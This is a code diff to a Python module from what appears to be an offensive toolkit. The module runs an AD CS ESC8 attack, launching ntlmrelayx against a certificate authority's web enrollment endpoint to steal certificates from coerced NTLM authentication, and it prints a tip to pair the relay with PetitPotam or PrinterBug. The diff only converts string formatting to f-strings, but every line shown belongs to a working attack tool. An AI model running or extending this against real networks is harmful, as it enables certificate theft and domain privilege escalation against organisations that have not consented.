@@ -1,5 +1,4 @@
 """AD CS relay — ESC8 HTTP enrollment relay for certificate theft."""
-from __future__ import annotations
 import subprocess
 import sys
 import shutil
@@ -27,14 +26,14 @@ def run(args: Any) -> int:
 
     cmd = [
         "ntlmrelayx.py", "-smb2support",
-        "-t", "http://{}/certsrv/certfnsh.asp".format(ca_host),
+        "-t", f"http://{ca_host}/certsrv/certfnsh.asp",
         "--adcs", "--template", template,
     ]
 
     if targets_file:
         cmd.extend(["-tf", targets_file])
 
-    print("[*] AD CS ESC8 relay → CA={}, template={}".format(ca_host, template))
+    print(f"[*] AD CS ESC8 relay → CA={ca_host}, template={template}")
     print("[*] Waiting for coerced auth to relay to certsrv...")
     print("[*] Command: {}".format(" ".join(cmd)))
     print("[*] Tip: combine with PetitPotam/PrinterBug for coercion source")
@@ -42,9 +41,9 @@ def run(args: Any) -> int:
     try:
         proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                 text=True, bufsize=1)
-        print("[+] Relay running (PID {})".format(proc.pid))
+        print(f"[+] Relay running (PID {proc.pid})")
         for line in proc.stdout:
-            print("  {}".format(line.rstrip()))
+            print(f"  {line.rstrip()}")
             if "certificate" in line.lower() or "base64" in line.lower():
                 print("[+] Certificate obtained!")
                 break
@@ -53,5 +52,5 @@ def run(args: Any) -> int:
         print("\n[*] Relay stopped")
         return 0
     except Exception as exc:
-        print("[-] ADCS relay error: {}".format(exc), file=sys.stderr)
+        print(f"[-] ADCS relay error: {exc}", file=sys.stderr)
         return 1
